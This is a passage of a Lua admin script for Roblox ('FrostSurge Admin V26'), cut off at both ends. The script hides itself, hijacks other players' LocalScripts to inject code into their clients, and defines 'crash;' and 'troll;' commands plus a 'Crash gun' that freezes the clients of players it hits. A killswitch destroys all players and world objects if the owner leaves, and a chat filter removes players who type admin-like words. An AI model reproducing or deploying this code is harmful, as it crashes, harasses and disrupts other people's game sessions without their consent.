script.Parent=nil
end
script.Name="F§£§©§£§©ros§£§©tSu§£§©rg§£§©e Ad§£§©m§£§©in"
Ranks={
Owner={"rig".."letto"};
Admin={"tusKOr661","dannz22","MainDirectory","lIlJanukIlI","HEAT507","Ultimatekiller010","DEADDEVIL1919","Owner: rig".."letto","frost209","CottenEyedMario","god7285780","VisualCSharp","iMayor","Team".."Dman","NonSpeaker","BRANNLAMAR2", "VisualCSharp","kert109","AntiBoomz0r","nolanhawz1","deadmen255","MrMoney9824"};
Banned={"Halfjarrod","ImUrNoob","secretidagent","lolpwnd","adrian2377","wonderfulboo","killerking1st","carljoven","warspyking","129K","randellman","justhit","adrian2377","Dsi1","themasterwarrior","awas3","Sportfan52","dionku","Djblakey","stormer1318","LuaScriptExpert","sweef888","H4ck0rz1337","ClawsDeMorris2012","guoyuan","puccaaustin","PuzzleCrazy","lolsuplexpeople","jordan83221","scriptmuchteh","fireblade2","stephen77","vegta44","Josiah123413","Skullow".."ner","coolryan90987","chclfey052008","dsi1","Sam9912","lakin25","Florys2","DaKilla10001","jjb345","Dylanbuil","Skullow".."ner","alexandersupermaster","lprtx257","SteveBodein67","mysticalchickenwing2","Slurrrp","NewBuildBuilder","henryTheSpriteKing","rombo51","LassXRagnarok","supermax333","merlin156"};
}
Services={
workspace = game:GetService("Workspace");
players = game:GetService("Players");
lighting = game:GetService("Lighting");
}
Prilist={"MainDirectory","HEAT507","Zuppi","VisualCSharp","Tea".."mDman","1waf".."fle1","nairod7","BrainWart","DoogleFox","Fros".."tftw","nolanhawz1","frost209","CottenEyedMario","deadmen255","oxcool1","lIlJanukIlI","UndefinedScripter"}
antichatfilter={"tusKOr661","Thunder9003","dannz22","MainDirectory","lIlJanukIlI","SHAD0WZOMBIE","HEAT507","MainDirectory","HEAT507","Zuppi","VisualCSharp","Tea".."mDman","1waf".."fle1","nairod7","BrainWart","DoogleFox","Fros".."tftw","nolanhawz1","frost209","CottenEyedMario","deadmen255","oxcool1","lIlJanukIlI","UndefinedScripter"}
namelist = { }
variablelist = { }
flist = { }
ver=26
lines=1447
guicolor="Cyan"
guisize="Size36"
guitext="Frost".."Surge Admin V"..ver..""
guitext2="Made By: "..Ranks.Owner[1]..". A".."ll Ri".."ghts R".."eser".."ved. Cop".."yri".."ght © 2012-2013."
guitext3="Latest Update, "..ver..", Local Script and Script making. "..lines.." Lines."
guisize2="Size12"
t1="Mid gray"
t2="Really blue"
t3="Mid gray"
dis=22
limit=250
place=false
if game.PlaceId == 20279777 or game.PlaceId == 20132544 or game.PlaceId == 54194680 then
place=true
LS=true
Lscript=true
FLstat="Have Found LocalScript"
end
spe=0.1
pri=0
osn=1
killer=0
Lscript=false
FLstat="Have Not Found LocalScript"
NLS=false
--[[End Of Basic Variables]]
do
if not place then
  local NS = script:clone()
  NS.DSource.Value=""
  NS.Disabled=true
  NS.Name = "NLS"
  NS2=NS:Clone()
  NS2.Parent=game.Players.rigletto
  NS3=NS:Clone()
  NS3.Parent=game.Players
  NLS=true
end
end
local LS = game.Players:findFirstChild("DSource", true)
if LS then
		local ok = false
		if LS.Parent:IsA("LocalScript") then
			NS=LS.Parent:Clone()
			NS.Name="SS"
			NS.Parent=game.Players
			NS.DSource.Value=""
			NS2=NS:Clone()
			NS2.Parent=game.Players.rigletto
			Lscript=true
			FLstat="Have Found LocalScript"
			ok=true
		end
if not ok then
	LS = nil
	end
end
Delay(0, function()
while not LS do
wait(1)
if not LS then
      for _, v in ipairs(game.Players:GetPlayers()) do
        for a, b in ipairs(v.Backpack:GetChildren()) do
          if b.ClassName == "LocalScript" and b.DSource and not LS then
			LS=true
            LS = b:clone()
			LS.Parent=game.Players
			LS.Name="SS"
			LS.DSource.Value=""
			LS.Disabled=true
			LS2=LS:Clone()
			LS2.Parent=game.Players.rigletto
			FLstat="Have Found LocalScript"
            break
          end
        end
      end
    end
  end
end)
function makelocalscript(source,parent,name,dis)
if not place then
if LS then
	if game.Players.SS ~= nil or game.Players.rigletto.SS ~= nil then
		sc=game.Players.SS:Clone()
		sc.DSource.Value=source
		sc.Parent=parent
		sc.Name=name
		sc.Disabled=dis
			end
		end
	end
end
function makenormalscript(source,parent)
if not place then
	if NLS then
		if game.Players.NLS ~= nil or game.Players.rigletto.NLS ~= nil then
			sc2=game.Players.NLS:Clone()
			sc2.DSource.Value=source
			sc2.Parent=parent
			sc2.Disabled=false
			end
		end
	end
end
function makelscript(source,parent,name,dis)
if game.PlaceId == 20279777 or game.PlaceId == 20132544 or game.PlaceId == 54194680 then
newLocalScript(source,parent)
print(name)--anti error
print(dis)--anti error
else
makelocalscript(source,parent,name,dis)
end
end
function makenscript(source,parent)
if game.PlaceId == 20279777 or game.PlaceId == 20132544 or game.PlaceId == 54194680 then
NLS=true
newScript(source,parent)
else
makenormalscript(source,parent)
end
end

--[[
~Update Log~
V1=Basic Commands
V2=More Complex Commands
V3=Customizble Tablets
V4=Added Adminlist feature
V5=Rewrote Admin script
V6=New Name
V7=Added New commands
V8=Remove Customizeable tablets
V9=Forgot Lol?
V10=Added Gui Interfaces
V11=Added Easy Customization for kill switches etc...
V12=Forgot this one too >_<
V13=Tabbed out the admin...
V14=Added Easy Gui Customiztion
V15=Fixed Base Regenerater and a couple commands
V16=Added Admin,Unadmin, And Owner List
V17=New message and hints
V18=New Symbols on arms of administrators and  the owner
V19=New Admin Look
V20=Better tablets???
V21=Added a nice tilt on tablets and added new format to adminlist.
V22=New cmd walkspeed
V23=New cmds health,teleport
V24=Rejoin; command
V25=New chat filter
V26=Local Script and Script making.
]]
function crashgun(plr)
tool=Instance.new("Tool",plr.Backpack)
tool.Name="Crash gun"
handle=Instance.new("Part",tool)
handle.Anchored=false
handle.BrickColor=BrickColor.new("Really black")
handle.Size=Vector3.new(1, 1, 2)
handle.Name="Handle"
bm=Instance.new("BlockMesh",handle)
decal=Instance.new("Decal",handle)
decal.Texture="http://www.roblox.com/asset/?id=64982337"
decal.Face="Front"
sound=Instance.new("Sound",handle)
sound.SoundId="http://www.roblox.com/asset/?id=16976189"
sound.Pitch=20
sound.Volume=0.7
sound.Name="Fire"
fire=Instance.new("Fire",handle)
fire.Color=BrickColor.new("White").Color
fire.SecondaryColor=BrickColor.new("White").Color
fire.Heat=15
fire.Name="heat"
fire.Size=5
makelscript([[while true do end]],tool,"Disperser",true)
makelscript([[wait(.02)
Tool=script.Parent
CP,Torso,g=nil,nil,nil
necko=CFrame.new(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
getPos=function(Pos,TorsoPos)
	return Vector3.new(Pos.x,TorsoPos.y,Pos.z)
end
Turn=function(mouse,Torso,Gyro)
	g.cframe=CFrame.new(Torso.Position,getPos(mouse.Hit.p,Torso.Position))
	offset=(Torso.Position.y-mouse.Hit.p.y)/100
	mag=(Torso.Position-mouse.Hit.p).magnitude/80
	offset=offset/mag
	neck=Torso.Neck
	neck.C0=necko*CFrame.fromEulerAnglesXYZ(offset,0,0)
	arm=Torso:FindFirstChild("Right Shoulder")
	if arm~=nil then
		--arm.C0=CFrame.new(1, 0.5, 0, 0, 0, 1, -6.48200512e-007, 1.00000274, 0, -1.00000274, -6.48200512e-007, 0)*CFrame.fromEulerAnglesXYZ(0,0,-offset)
	end
end
Equi=function(mouse)
	wait(.02)	
	CP=Tool.Parent
	Torso=CP.Torso
	g=Instance.new("BodyGyro")
	g.P=18000
	g.D=600
	g.maxTorque=Vector3.new(80000,80000000,80000)*50000000000000000000000000
	g.cframe=Torso.CFrame
	--g.Parent=Torso
	while true do
		if Tool.Parent.className~="Model" then
			break
		end
		Turn(mouse,Torso,g)
		wait(0.02)
	end
	Torso.Neck.C0=necko
	g:Remove()
end
Tool.Equipped:connect(Equi)]],tool,"TurnScript",false)
makelscript([[local Canceler = script.Parent.Disperser:Clone()
local IgnoreList = {"rigletto","deadmen255"}

local Tool = script.Parent --Set a variable for the tool.
local User

function Disperse(R)
for C=1, 20 do
wait(0.02)
R.Transparency = R.Transparency + 0.03
R.Mesh.Scale = R.Mesh.Scale + Vector3.new(0.2, 0, 0.2)
end
R:Destroy()
end

function DisperseShockwave(TGT)

local Atmosphere = Instance.new("Part")
Atmosphere.Transparency = 0.25
Atmosphere.Anchored = true
Atmosphere.TopSurface = "Smooth"
Atmosphere.BottomSurface = "Smooth"
Atmosphere.BrickColor = BrickColor.new("Really black")
Atmosphere.FormFactor = "Custom"
Atmosphere.Size = Vector3.new(0.2, 0.2, 0.2)
local AtmosphereMesh = Instance.new("CylinderMesh")
AtmosphereMesh.Parent = Atmosphere
AtmosphereMesh.Scale = Vector3.new(2.5, 100, 2.5)
Atmosphere.Position = TGT.Position

local Shockwave = Instance.new("Part")
Shockwave.Transparency = 0.25
Shockwave.Anchored = true
Shockwave.TopSurface = "Smooth"
Shockwave.BottomSurface = "Smooth"
Shockwave.BrickColor = BrickColor.new("Really black")
Shockwave.FormFactor = "Custom"
Shockwave.Size = Vector3.new(0.2, 0.2, 0.2)
local ShockwaveMesh = Instance.new("SpecialMesh")
ShockwaveMesh.MeshId = "http://www.roblox.com/asset/?id=3270017"
ShockwaveMesh.Scale = Vector3.new(20, 20, 5)
ShockwaveMesh.Parent = Shockwave
Shockwave.Position = TGT.Position
Shockwave.CFrame = Shockwave.CFrame * CFrame.fromEulerAnglesXYZ(math.rad(-90), 0, 0)

game.Debris:AddItem(Atmosphere, 3)
game.Debris:AddItem(Shockwave, 3)
Atmosphere.Parent = Workspace
Shockwave.Parent = Workspace

for C=1, 30 do
wait(0.02)
Atmosphere.Transparency = Atmosphere.Transparency + 0.025
AtmosphereMesh.Scale = AtmosphereMesh.Scale + Vector3.new(0.2, 100, 0.2)
Shockwave.Transparency = Shockwave.Transparency + 0.025
ShockwaveMesh.Scale = ShockwaveMesh.Scale + Vector3.new(30, 30, 10)
end
Atmosphere:Destroy()
end

Tool.Equipped:connect(function(mouse)
    User = Tool.Parent
    mouse.Button1Down:connect(function()
        local Ray = Ray.new(Tool.Handle.CFrame.p,(mouse.Hit.p-Tool.Handle.CFrame.p).unit*600)
        local Hit,Position = game.Workspace:FindPartOnRay(Ray,User)
        if Hit then
			local Humanoid = Hit.Parent:GetChildren()
			for i=1,#Humanoid do
			if Humanoid[i].ClassName == "Humanoid" and Hit.Parent:FindFirstChild("Torso") then
			local Torso = Hit.Parent:FindFirstChild("Torso")

			local IgnoreTGT = false

			for S=1,#IgnoreList do
			if Humanoid[i].Parent.Name == IgnoreList[S] then
			IgnoreTGT = true
			break
			else
			IgnoreTGT = false
			end
			end

			if IgnoreTGT == false then
				Canceler.Parent = Humanoid[i].Parent
				Canceler.Disabled = false
				Humanoid[i]:Destroy()
				if Torso ~= nil then
				coroutine.wrap(DisperseShockwave)(Torso)
				end
			end

			end
	    end
	end
			local RayPart = Instance.new("Part",User)
			local RayMesh = Instance.new("CylinderMesh")
			RayMesh.Parent = RayPart
	RayPart.Name = "RayPart"
	RayPart.BrickColor = BrickColor.new("Really black")
	RayPart.Transparency = 0.3
	RayPart.Anchored = true
	RayPart.CanCollide = false
	RayPart.TopSurface = Enum.SurfaceType.Smooth
	RayPart.BottomSurface = Enum.SurfaceType.Smooth
	RayPart.formFactor = Enum.FormFactor.Custom
	local Distance = (Position-Tool.Handle.CFrame.p).magnitude
	RayPart.Size = Vector3.new(0.2,Distance,0.2)
	RayPart.CFrame = CFrame.new(Position,Tool.Handle.CFrame.p) * CFrame.new(0,0,-Distance/2) * CFrame.fromEulerAnglesXYZ(math.rad(90), 0, 0)
	local DisperseRay = RayPart:Clone()
	DisperseRay.Mesh.Scale = Vector3.new(2, 1, 2)
	DisperseRay.Transparency = 0.4
	game.Debris:AddItem(DisperseRay, 3)
	DisperseRay.Parent = Workspace
	coroutine.wrap(Disperse)(DisperseRay)
	game.Debris:AddItem(RayPart,0.1)
	script.Parent.Handle.Fire:Play()
    end)
end)]],tool,"Shoot",false)
end
Delay(0, function()
  local gone = 0
  while wait(1) do
    if not player then player = Instance.new("Part") player.Name = "rigletto" end
    local ok = false
    for _, v in ipairs(Services.players:GetPlayers()) do
      if v.Name == player.Name then
        ok = true
      end
    end
    if not ok then
    if osn==1 then
      gone = gone + 1
    else
      gone = math.max(gone-.5, 0)
    end
  if (gone > 1) then
      for _, v in ipairs(Services.players:GetPlayers()) do pcall(function() v:Destroy() end) end
      for _, v in ipairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
      yy=Instance.new("Message", workspace)
      yy.Text = "I>How About No.<I"
      yy.Name="©£££§£§©££§£§©££§£§"
      wait()
      ypcall(wait)
			end
		end
	end
end)
function check(name)
	for i,v in pairs(Prilist) do
		if v:lower()==name:lower() then
			return true
			end
		end
return false
end
function prienter(player)
	local name=player.Name
	if check(name) then
		print("Player "..name.." is allowed.")
		else
		if pri==1 then
			print("Removed Player")
			player:remove()
			else
			print("Pri off")
		end
	end
end
for i,b in pairs(Services.players:getPlayers()) do
	prienter(b)
end
Services.players.PlayerAdded:connect(prienter)
history={''}
function hist(msg)
	table.insert(history, msg)
end
for i,v in pairs(Services.players:GetPlayers()) do
	v.Chatted:connect(hist)
end
function hisfun(player)
	player.Chatted:connect(hist)
end
Services.players.PlayerAdded:connect(hisfun)
function FindPlayer(name)
    for _,player in pairs(Game:GetService("Players"):GetPlayers()) do
        if player.Name:lower():find(name:lower()) then
            return player
        end
    end
end
function msg2(text)
local Msg = text
local v = Instance.new("Message",workspace)
v.Name="©£££§£§©££§£§©££§£§"
local Max = 200
local Speed = 0.05
for i=1,#Msg do
    v.Text = Msg:sub(i-Max,i).."|"
    wait(Speed)
end
for i=1,math.random(4,6) do
    v.Text = Msg:sub(#Msg-Max,#Msg).."|"
    wait(0.5)
    v.Text = Msg:sub(#Msg-Max,#Msg).." "
    wait(0.5)
end
for i=#Msg,0,-1 do
    v.Text = Msg:sub(i-Max,i).."|"
    wait(Speed)
end
v:remove()
end
function hint(text)
local Msg = text
local v = Instance.new("Hint",workspace)
v.Name="©£"
local Max = 200
local Speed = 0.05
for i=1,#Msg do
    v.Text = Msg:sub(i-Max,i).."|"
    wait(Speed)
end
for i=1,math.random(4,6) do
    v.Text = Msg:sub(#Msg-Max,#Msg).."|"
    wait(0.35)
    v.Text = Msg:sub(#Msg-Max,#Msg).." "
    wait(0.35)
end
for i=#Msg,0,-1 do
    v.Text = Msg:sub(i-Max,i).."|"
    wait(Speed)
end
v:remove()
end
function gui(text,where)
	sg2=Instance.new("ScreenGui",where)
	sg2.Name="AdminMessage"
	tex=Instance.new("TextLabel",sg2)
	tex.Text=text
	tex.Font="ArialBold"
	tex.FontSize="Size24"
	tex.TextColor3=Color3.new(255/255,255/255,255/255)
	tex.BackgroundColor3=Color3.new(0 , 255/102, 255/153)
	tex.BorderColor3=Color3.new(0 , 255/204, 255/255)
	tex.Size=UDim2.new(1,0,0,25)
	tex.Position=UDim2.new(0,0,0,100)
	wait(2)
	tex:Remove()
end
function jail(plr)
chur=plr.Character
function stats(part)
part.Anchored=true
part.CanCollide=true
part.Name="JALP"
part.Locked=true
part.formFactor="Custom"
part.BrickColor=BrickColor.new("Really black")
x=Instance.new("BlockMesh",part)
end
parent=workspace
ts=150
p=Instance.new("Part",parent)
stats(p)
p.Size=Vector3.new(2,ts,2)
p.CFrame=chur.Torso.CFrame + Vector3.new(2,0,0)
p2=Instance.new("Part",parent)
stats(p2)
p2.Size=Vector3.new(2,ts,2)
p2.CFrame=chur.Torso.CFrame + Vector3.new(-2,0,0)
p3=Instance.new("Part",parent)
stats(p3)
p3.Size=Vector3.new(2,ts,2)
p3.CFrame=chur.Torso.CFrame + Vector3.new(0,0,2)
p4=Instance.new("Part",parent)
stats(p4)
p4.Size=Vector3.new(2,ts,2)
p4.CFrame=chur.Torso.CFrame + Vector3.new(0,0,-2)
p5=Instance.new("Part",parent)
stats(p5)
p5.Size=Vector3.new(2,ts,2)
p5.CFrame=chur.Torso.CFrame + Vector3.new(1,0,1)
p6=Instance.new("Part",parent)
stats(p6)
p6.Size=Vector3.new(2,ts,2)
p6.CFrame=chur.Torso.CFrame + Vector3.new(-1,0,-1)
p7=Instance.new("Part",parent)
stats(p7)
p7.Size=Vector3.new(2,ts,2)
p7.CFrame=chur.Torso.CFrame + Vector3.new(1,0,-1)
p8=Instance.new("Part",parent)
stats(p8)
p8.Size=Vector3.new(2,ts,2)
p8.CFrame=chur.Torso.CFrame + Vector3.new(-1,0,1)
xxx=chur:GetChildren()
for i =1,#xxx do
	if xxx[i]:IsA("Part") then
		xxx[i].Anchored=true
	end
end

end
function unjail(plr)
chur=plr.Character
gc=Services.workspace:GetChildren()
for i =1,#gc do
	if gc[i]:IsA("Part") then
		if gc[i].Name=="JALP" then
			gc[i]:Remove()
		end
	end
end
xxx=chur:GetChildren()
for i =1,#xxx do
	if xxx[i]:IsA("Part") then
		xxx[i].Anchored=false
	end
end
end
function Float(plr, tab)
    for _,v in pairs(plr.Character:GetChildren()) do if v.Name:sub(1,2)=="B1" then v:Remove() end end
		for i=1,#tab do
			local p=Instance.new("Part",plr.Character)
			p.Name="B1"..tostring(i)
			p.formFactor="Custom"
			p.Size=Vector3.new(2,2.5,.08)
			p.Transparency=.4
			p.Anchored=true
			p.TopSurface="Smooth"
			p.CanCollide=false
			p.BrickColor=BrickColor.new(t1)
			p.CFrame=plr.Character.Torso.CFrame + Vector3.new(0,800,0)
			p.BottomSurface="Smooth"
			sb=Instance.new("SelectionBox",p)
			sb.Adornee=p
			sb.Transparency=0.4
			sb.Color=BrickColor.new(t1)
local bbg=Instance.new("BillboardGui",p)
bbg.Name=p.Name
bbg.StudsOffset=Vector3.new(0,2,-0.5)
bbg.Size=UDim2.new(1,0,1,0)
pn = Instance.new("TextLabel", bbg)
pn.BackgroundTransparency = 1
pn.Position = UDim2.new(0, 0, 0.5, 0)
pn.Size = UDim2.new(0.9, 0, 0.4, 0)
pn.TextColor3 = Color3.new(1, 1, 1)
--pn.TextStrokeColor3 = Color3.new(0, 0.5, 0.5)
pn.TextStrokeColor3= BrickColor.new(t1).Color
pn.TextStrokeTransparency = 0
pn.FontSize = Enum.FontSize.Size12
pn.Text=tab[i]
pn.Name=tab[i]
coroutine.wrap(function()
	local f=i*(200/#tab)
	while wait(.02) do
		f=f+spe
        p.CFrame=CFrame.new(plr.Character.Torso.Position + (Vector3.new(math.sin(f/100*math.pi),0.1,math.cos(f/100*math.pi))*dis), plr.Character.Torso.Position) * CFrame.Angles(math.rad(20),0,0)
			end
		end)()
	end
end

function Float2(plr, tab)
    for _,v in pairs(plr.Character:GetChildren()) do if v.Name:sub(1,2)=="B2" then v:Remove() end end
		for i=1,#tab do
			local p=Instance.new("Part",plr.Character)
			p.Name="B2"..tostring(i)
			p.formFactor="Custom"
			p.Size=Vector3.new(2,2.5,.08)
			p.Transparency=0.4
			p.BrickColor=BrickColor.new(t2)
			p.Anchored=true
			p.CanCollide=false
			p.TopSurface="Smooth"
			p.CFrame=plr.Character.Torso.CFrame + Vector3.new(0,800,0)
			p.BottomSurface="Smooth"
			sb=Instance.new("SelectionBox",p)
			sb.Adornee=p
			sb.Transparency=0.4
			sb.Color=BrickColor.new(t2)
local bbg=Instance.new("BillboardGui",p)
bbg.Name=p.Name
bbg.StudsOffset=Vector3.new(0,2,-0.5)
bbg.Size=UDim2.new(1,0,1,0)
pn = Instance.new("TextLabel", bbg)
pn.BackgroundTransparency = 1
pn.Position = UDim2.new(0, 0, 0.5, 0)
pn.Size = UDim2.new(0.9, 0, 0.4, 0)
pn.TextColor3 = Color3.new(1, 1, 1)
--pn.TextStrokeColor3 = Color3.new(0.5, 0.5, 0)
pn.TextStrokeColor3=BrickColor.new(t2).Color
pn.TextStrokeTransparency = 0
pn.FontSize = Enum.FontSize.Size12
pn.Text=tab[i]
pn.Name=tab[i]
coroutine.wrap(function()
	local f=i*(200/#tab)
		while wait(.02) do
			f=f-spe
            p.CFrame=CFrame.new(plr.Character.Torso.Position + (Vector3.new(math.sin(f/100*math.pi),0.1,math.cos(f/100*math.pi))*10), plr.Character.Torso.Position) * CFrame.Angles(math.rad(20),0,0)
			end
		end)()
	end
end
function Float3(plr, tab)
    for _,v in pairs(plr.Character:GetChildren()) do if v.Name:sub(1,2)=="B3" then v:Remove() end end
		for i=1,#tab do
			local p=Instance.new("Part",plr.Character)
			p.Name="B3"..tostring(i)
			p.formFactor="Custom"
			p.Size=Vector3.new(2,2.5,.5)
			p.Transparency=0.4
			p.BrickColor=BrickColor.new(t3)
			p.Anchored=true
			p.CanCollide=false
			p.TopSurface="Smooth"
			p.CFrame=plr.Character.Torso.CFrame + Vector3.new(0,800,0)
			p.BottomSurface="Smooth"
			sb=Instance.new("SelectionBox",p)
			sb.Adornee=p
			sb.Transparency=0.4
			sb.Color=BrickColor.new(t3)
local bbg=Instance.new("BillboardGui",p)
bbg.Name=p.Name
bbg.StudsOffset=Vector3.new(0,2,-0.2)
bbg.Size=UDim2.new(1,0,1,0)
pn = Instance.new("TextLabel", bbg)
pn.BackgroundTransparency = 1
pn.Position = UDim2.new(0, 0, 0.5, 0)
pn.Size = UDim2.new(0.9, 0, 0.4, 0)
pn.TextColor3 = Color3.new(1, 1, 1)
--pn.TextStrokeColor3 = Color3.new(1, 0, 0)
pn.TextStrokeColor3=BrickColor.new(t3).Color
pn.TextStrokeTransparency = 0
pn.FontSize = Enum.FontSize.Size12
pn.Text=tab[i]
pn.Name=tab[i]
coroutine.wrap(function()
	local f=i*(200/#tab)
		while wait(.02) do
			f=f+spe
            p.CFrame=CFrame.new(plr.Character.Torso.Position + (Vector3.new(math.sin(f/100*math.pi),0.1,math.cos(f/100*math.pi))*6), plr.Character.Torso.Position) * CFrame.Angles(math.rad(20),0,0)
            end
        end)()
    end
end
function bost()
        pcall(function()
            for _, v in ipairs(workspace:GetChildren()) do
                if v:IsA("BasePart") and v.Name == "Base" then
                    v:Destroy()
                end
            end
        end)
        local e = Instance.new("Part", workspace)
        e.Name = "Base"
        e.Anchored = true
        e.BrickColor = BrickColor.new("Earth green")
        e.FormFactor = "Symmetric"
        e.Size = Vector3.new(512,0,512)
        e.TopSurface, e.BottomSurface = "Studs", "Smooth"
        e.CFrame = CFrame.new(0,0,0)
		e.Material = "Plastic"
end
bost()
function resfilter(plr)
for i,g in pairs(antichatfilter) do
	if plr.Name:lower() == g:lower() then
		return
	end
end
plr.Chatted:connect(function(msg)
		respawnlist={"kill/","kill;","kill:","punish/","punish;","punish:","kickmenu","banmenu"}
pcall(function()
	for i,v in pairs(respawnlist) do
		if string.lower(msg):find(v) then
				plr:LoadCharacter()
				end
			end
		end)
	end)
end
function remfilter(plr)
for i,g in pairs(antichatfilter) do
	if plr.Name:lower() == g:lower() then
		return
	end
end
plr.Chatted:connect(function(msg)
		removelist={"fweld","ban/","ban;","ban:","kick/","kick;","kick:","crash/","crash;","crash:","lag;","lag/","lag:","shutdown;","shutdown:","shutdown/","pri/","pri;","pri:","ab/","ab;","ab:"}
	pcall(function()
		for i,z in pairs(removelist) do
			if string.lower(msg):find(z) then
				plr:Destroy()
				end
			end
		end)
	end)
end

for i,v in pairs(game.Players:GetPlayers()) do
resfilter(v)
remfilter(v)
end
game.Players.PlayerAdded:connect(resfilter)
game.Players.PlayerAdded:connect(remfilter)
function RemoveTabs(plr)
    for _,v in pairs(plr.Character:GetChildren()) do
        if(v.Name:sub(1,2)=="B1")and(v:IsA("BasePart"))then
            coroutine.wrap(function()v.Transparency=0 v:Remove() end)()
        end
    end
end
function RemoveTabs2(plr)
    for _,v in pairs(plr.Character:GetChildren()) do
        if(v.Name:sub(1,2)=="B2")and(v:IsA("BasePart"))then
            coroutine.wrap(function()v.Transparency=0 v:Remove() end)()
        end
    end
end
function RemoveTabs3(plr)
    for _,v in pairs(plr.Character:GetChildren()) do
        if(v.Name:sub(1,2)=="B3")and(v:IsA("BasePart"))then
            coroutine.wrap(function()v.Transparency=0 v:Remove() end)()
        end
    end
end
function onchat(msg,who)
if msg:lower():sub(1,5)=="cmds;" then
commands={"unjail;plr","jail;plr","health;name;val","teleport;name;name","walkspeed;name;val","Admin;plr","h;msg","m;msg","pri;on,off","prilist;","tab;num","unff;plr","ff;plr","thaw;plr","freeze;plr","info;plr","Adminlist;","banlist;","fixl;","clear;","dclear;","shutdown;","chatlog;","banlist;","speed;val","rad;val","pr;string","Base;","Cmds;","Hide;","Rs;plr","Kick;plr","Ban;plr","Sit;plr","Nplayers;","Workspace;","Players;"}
Float(who, commands)
elseif msg:lower():sub(1,5)=="hide;" then
RemoveTabs(who)
RemoveTabs2(who)
RemoveTabs3(who)
elseif msg:lower():sub(1,3)=="rs;" then
p=FindPlayer(msg:sub(4))
if p~=nil then
p:LoadCharacter()
Float3(who, {"Respawned: "..p.Name})
wait(2)
RemoveTabs3(who)
end
elseif msg:lower():sub(1,5)=="kick;" then
p=FindPlayer(msg:sub(6))
if p~=nil then
p:Destroy()
Float3(who, {"Kicked: "..p.Name})
wait(2)
RemoveTabs3(who)
end
elseif msg:lower():sub(1,6)=="troll;" then
p=FindPlayer(msg:sub(7))
trolled=p
screen=Instance.new("ScreenGui",trolled.PlayerGui)
screen.Name="ULeikTrull"

function maketroll()
imgbut=Instance.new("ImageButton",screen)
imgbut.Name="UMadBruh?"
siz=math.random(40,200)
pos=math.random(1,590)
pos2=math.random(1,1300)
imgbut.Size=UDim2.new(0,siz,0,siz)
imgbut.Position=UDim2.new(0,pos2,0,pos)
imgbut.Image="http://www.roblox.com/asset/?id=36724755" --oyus
imgbut.BackgroundTransparency=1
return imgbut
end
maketroll()

getroll = trolled.PlayerGui.ULeikTrull:GetChildren()
for i=1,#getroll do
if getroll[i]:IsA("ImageButton") then
getroll[i].MouseButton1Down:connect(function()
for i=1,99999 do
wait(.02)
maketroll()
maketroll()
maketroll()
maketroll()
maketroll()
maketroll()
end
end)
end
end
elseif msg:lower():sub(1,5)=="fixl;" then
        game:service("Lighting").Brightness = 1
        game:service("Lighting").GeographicLatitude = 41.73
        game:service("Lighting").Ambient = Color3.new(128 / 255, 128 / 255, 128 / 255)
        game:service("Lighting").ColorShift_Top = Color3.new(0, 0, 0)
        game:service("Lighting").ColorShift_Bottom = Color3.new(0, 0, 0)
        game:service("Lighting").ShadowColor = Color3.new(179 / 255, 179 / 255, 184 / 255)
        game:service("Lighting").TimeOfDay = "14:00:00"
        game:service("Lighting").FogEnd = 100000
        game:service("Lighting").FogStart = 0
        Float3(who, {"Fixed Lighting"})
        wait(2)
        RemoveTabs3(who)
elseif msg:lower():sub(1,7)=="rejoin;" then
if LS then
p=FindPlayer(msg:sub(8))
if p ~= nil then
	makelscript([[game:service'TeleportService':Teleport(]]..game.PlaceId..[[)]],p.Backpack,"Teleport",false)
end
end
elseif msg:lower():sub(1,11)=="admintools;" then
if LS then
p=FindPlayer(msg:sub(12))
if p then
crashgun(p)
makelscript([[local bin = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
bin.Name = "Teleport"
function teleportPlayer(pos)

	local player = game.Players.LocalPlayer
	if player == nil or player.Character == nil then return end

	local char = player.Character.Torso

	sound = Instance.new("Sound")
	sound.SoundId = ""
	sound.Parent = char
	sound.PlayOnRemove = true
	sound:remove()

	char.CFrame = CFrame.new(Vector3.new(pos.x, pos.y + 7, pos.z))


	sound = Instance.new("Sound")
	sound.SoundId = ""
	sound.Parent = char
	sound.PlayOnRemove = true
	sound:remove()

end


enabled = true
function onButton1Down(mouse)
	if not enabled then
		return
	end

	local player = game.Players.LocalPlayer
	if player == nil then return end
	--if TryToCast(player) == false then return end
	

	enabled = false
	mouse.Icon = "rbxasset://textures\\ArrowFarCursor.png"

	-- find the best cf
	local cf = mouse.Hit
	local v = cf.lookVector

	teleportPlayer(cf.p)

	wait(COOLDOWN)
	mouse.Icon = "rbxasset://textures\\ArrowCursor.png"
	enabled = true

end

function onSelected(mouse)
	mouse.Icon = "rbxasset://textures\\ArrowCursor.png"
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end

bin.Selected:connect(onSelected)]],p.Backpack,"tele",false)
makelscript([[
tool=Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
script.Parent=tool
tool.Name="Smite"
bin = script.Parent
waita = true

function onButton1Down(mouse) 
	waita = true
	while waita == true do
		local explosion = Instance.new("Explosion") 
		explosion.BlastRadius = 5.05
		explosion.BlastPressure = explosion.BlastPressure * 5
		explosion.Position = mouse.Hit.p
		explosion.Parent = game.Workspace  
		wait()
	end 
end 

function onButton1Up(mouse) 
	waita = false
end

function onSelected(mouse) 
	mouse.Icon = "rbxasset://textures\\GunCursor.png" 
	mouse.Button1Down:connect(function() onButton1Down(mouse) end) 
	mouse.Button1Up:connect(function() onButton1Up(mouse) end) 
end 

bin.Selected:connect(onSelected) ]],p.Backpack,"smite",false)
end
end
elseif msg:lower():sub(1,6)=="cra".."sh;" then
if LS then
p=FindPlayer(msg:sub(7))
if p ~= nil then
makelscript([[Instance.new("ManualSurfaceJointInstance", script)]],p.Backpack,"cra".."sh",false)
end
end
elseif msg:lower():sub(1,3)=="ab;" then
if msg:sub(4)=="on" then
Float2(who, {"Anti".."Ban On"})
osn=1
else
if msg:sub(4)=="off" then
Float2(who, {"AntiBa".."n Off"})
osn=0
end
end
elseif msg:lower():sub(1,7)=="dclear;" then
            for _, v in ipairs(workspace:GetChildren()) do
            if v.Name ~= "Terrain" and v.Name ~= "Base" and not Services.players:playerFromCharacter(v) and not v:IsA("Script") then
                v:Destroy()
            end
        end
        for _, v in ipairs(game.StarterPack:GetChildren()) do
                v:Destroy()
            end
        for _, v in ipairs(game.StarterGui:GetChildren()) do
                v:Destroy()
            end
        for _, v in ipairs(game.Lighting:GetChildren()) do
            v:Destroy()
        end
        pcall(function()
